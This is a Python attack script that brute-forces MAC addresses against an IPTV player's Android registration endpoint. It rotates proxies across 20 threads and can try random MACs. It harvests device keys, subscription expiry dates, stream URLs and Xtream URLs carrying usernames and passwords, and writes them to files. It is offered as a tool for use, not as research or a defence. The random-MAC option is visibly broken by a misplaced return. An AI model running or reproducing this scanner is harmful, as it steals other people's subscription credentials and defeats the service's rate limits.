import base64
import json
import requests
import re
import random
import threading
import time
import concurrent.futures
from typing import Dict, Any, Optional, Tuple, List
from urllib.parse import urlparse, urlunparse
from datetime import datetime

# Configuration
MAX_WORKERS = 20
PROXY_RETRIES = 3
REQUEST_TIMEOUT = 10
OUTPUT_FILE = "scan_results.txt"
M3U_FILE = "all_urls.txt"  # Changed from .m3u to .txt

class ProxyManager:
    """Handles proxy rotation and management"""
    def __init__(self, proxy_file: str = None):
        self.proxies = []
        self.lock = threading.Lock()
        if proxy_file:
            self.load_proxies(proxy_file)

    def load_proxies(self, file_path: str):
        """Load proxies from file"""
        try:
            with open(file_path, 'r') as f:
                with self.lock:
                    self.proxies = [line.strip() for line in f if line.strip()]
            print(f"‚úÖ Loaded {len(self.proxies)} proxies")
        except FileNotFoundError:
            print(f"‚ùå Proxy file not found: {file_path}")

    def get_proxy(self) -> Optional[Dict[str, str]]:
        """Get a random proxy"""
        with self.lock:
            if not self.proxies:
                return None
            proxy = random.choice(self.proxies)
            return {'http': proxy, 'https': proxy}

class MACValidator:
    """Handles MAC address validation"""
    @staticmethod
    def validate_mac(mac: str) -> Optional[str]:
        """Validate and format MAC address"""
        mac = re.sub(r'[^0-9A-Fa-f]', '', mac.upper())
        if len(mac) == 12 and all(c in '0123456789ABCDEF' for c in mac):
            return ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return None

class ResultFormatter:
    """Handles result formatting"""
    @staticmethod
    def clean_url(url: str) -> str:
        """Clean and format URL"""
        parsed = urlparse(url)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', parsed.query, ''))

    @staticmethod
    def format_xtream_url(url_data: Dict) -> Optional[str]:
        """Format Xtream URL if credentials exist"""
        if not all(key in url_data for key in ['url', 'username', 'password']):
            return None
        if not url_data['username'] or not url_data['password']:
            return None
            
        parsed = urlparse(url_data['url'])
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        if parsed.port:
            base_url = f"{parsed.scheme}://{parsed.netloc}:{parsed.port}"
        return f"{base_url}/player_api.php?username={url_data['username']}&password={url_data['password']}"

class ResultLogger:
    """Handles result logging"""
    def __init__(self):
        self.lock = threading.Lock()
        with open(OUTPUT_FILE, 'w') as f:
            f.write("MAC Scan Results\n" + "="*40 + "\n\n")
        with open(M3U_FILE, 'w') as f:
            f.write("")  # Start with an empty file, not an M3U header.
    
    def log_result(self, result: Dict):
        """Save result to files"""
        with self.lock:
            self._log_detailed_result(result)
            self._log_all_urls(result)
    
    def _log_detailed_result(self, result: Dict):
        """Save detailed result to scan_results.txt"""
        data = result['data']
        box = data.get('box_dtls', {})
        
        output = [
            f"üìÖ {datetime.now().strftime('%Y-%m-%d %H:%M')}",
            f"üîé {result['mac']}",
            f"üåê {result.get('proxy', 'Direct')}",
            f"üîë Key: {data.get('device_key', 'N/A')}",
            f"‚è≥ Expiry: {data.get('expiry_date', 'N/A')}",
            f"üëÄ Last Seen: {box.get('last_seen', 'N/A')}",
            f"üîÑ Switch: {box.get('switched_from', 'N/A')} ‚Üí {box.get('switched_to', 'N/A')}",
            f"üìÖ Switch Date: {box.get('switched_date', 'N/A')}"
        ]
        
        if 'urls' in data:
            output.append("\nüì∫ Streams:")
            for url in data['urls']:
                if "demo" not in url.get('url', '').lower():
                    clean_url = ResultFormatter.clean_url(url.get('url', ''))
                    output.append(f" - {url.get('playlist_name', 'N/A')}")
                    output.append(f"   {clean_url}")
                    xtream_url = ResultFormatter.format_xtream_url(url)
                    if xtream_url:
                        output.append(f"   Xtream: {xtream_url}")
        
        with open(OUTPUT_FILE, 'a') as f:
            f.write("\n".join(output) + "\n\n")
    
    def _log_all_urls(self, result: Dict):
        """Save only URLs to a plain text file (no M3U metadata)"""
        if 'data' not in result or 'urls' not in result['data']:
            return
            
        with open(M3U_FILE, 'a') as f:
            for url_data in result['data']['urls']:
                if "demo" in url_data.get('url', '').lower():
                    continue
                
                clean_url = ResultFormatter.clean_url(url_data.get('url', ''))
                if clean_url:
                    f.write(f"{clean_url}\n")
                
                xtream_url = ResultFormatter.format_xtream_url(url_data)
                if xtream_url:
                    f.write(f"{xtream_url}\n")

class MACScanner:
    """Main scanner class"""
    def __init__(self):
        self.proxy_manager = None
        self.logger = ResultLogger()
        self.success_count = 0

    def _scan_single(self, mac: str, use_proxy: bool = True) -> Optional[Dict]:
        """Scan a single MAC address"""
        valid_mac = MACValidator.validate_mac(mac)
        if not valid_mac:
            return None

        for attempt in range(PROXY_RETRIES):
            proxy = self.proxy_manager.get_proxy() if (use_proxy and self.proxy_manager) else None
            try:
                response = requests.post(
                    'https://4kottplayer.com/android-reg',
                    json={
                        "channelId": "IBOPLAYER",
                        "domainId": "IBOAPP",
                        "module": "IBO",
                        "requestEnc": base64.b64encode(json.dumps({
                            "appType": "android",
                            "macAddress": valid_mac
                        }).encode()).decode(),
                        "requestId": "boi1742301603660"
                    },
                    headers={
                        'User-Agent': 'okhttp/5.0.0-alpha.2',
                        'Content-Type': 'application/json'
                    },
                    proxies=proxy,
                    timeout=REQUEST_TIMEOUT
                )
                response.raise_for_status()
                data = json.loads(base64.b64decode(response.json()['responseData']).decode('utf-8'))
                self.success_count += 1
                return {
                    'mac': valid_mac,
                    'data': data,
                    'proxy': list(proxy.values())[0] if proxy else None
                }
            except Exception:
                time.sleep(1)
        return None

    def mass_scan(self, mac_list: List[str], proxy_file: str = None, use_proxy: bool = True):
        """Scan multiple MAC addresses"""
        if proxy_file and use_proxy:
            self.proxy_manager = ProxyManager(proxy_file)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {executor.submit(self._scan_single, mac, use_proxy): mac for mac in mac_list}
            for future in concurrent.futures.as_completed(futures):
                mac = futures[future]
                try:
                    result = future.result()
                    if result:
                        self._print_compact_result(result)
                        self.logger.log_result(result)
                except Exception as e:
                    print(f"  ‚ùå {mac}: {str(e)}")

    def _print_compact_result(self, result: Dict):
        """Print compact result line"""
        box = result['data'].get('box_dtls', {})
        print(f"  ‚úÖ {result['mac']} | Key: {result['data'].get('device_key', '?')} | "
              f"Exp: {result['data'].get('expiry_date', '?')} | "
              f"Switch: {box.get('switched_from', '?')}‚Üí{box.get('switched_to', '?')}")

def main():
    """Main entry point"""
    scanner = MACScanner()
    
    print("MAC Address Scanner - Complete URL Extractor")
    print("="*40 + "\n")
    
    choice = input("1. Single MAC\n2. MAC List\n3. Random MACs\n> ").strip()
    
    if choice == '1':
        macs = [input("Enter MAC: ").strip()]
        use_proxy = False  # Skip proxy for single MAC scan
        proxy_file = None
    elif choice == '2':
        try:
            with open(input("File path: ").strip()) as f:
                macs = [line.strip() for line in f if line.strip()]
            use_proxy = input("Use proxies? (y/n): ").lower() == 'y'
            proxy_file = input("Proxy file: ").strip() if use_proxy else None
        except FileNotFoundError:
            print("‚ùå File not found")
            return
    elif choice == '3':
        count = input("How many random MACs to generate? ")
        try:
            count = int(count)
            macs = [':'.join(f"{random.randint(0,255):02X}" for _ in range(6)) 
                   for _ in range(count)]
            use_proxy = input("Use proxies? (y/n): ").lower() == 'y'
            proxy_file = input("Proxy file: ").strip() if use_proxy else None
        except ValueError:
          print("‚ùå Invalid choice")
        return
    
    print("\nStarting scan...\n")
    scanner.mass_scan(macs, proxy_file, use_proxy)
    print(f"\nScan complete!")
    print(f"- Detailed results saved to {OUTPUT_FILE}")
    print(f"- All URLs saved to {M3U_FILE} (plain text format)")

if __name__ == "__main__":
    main()
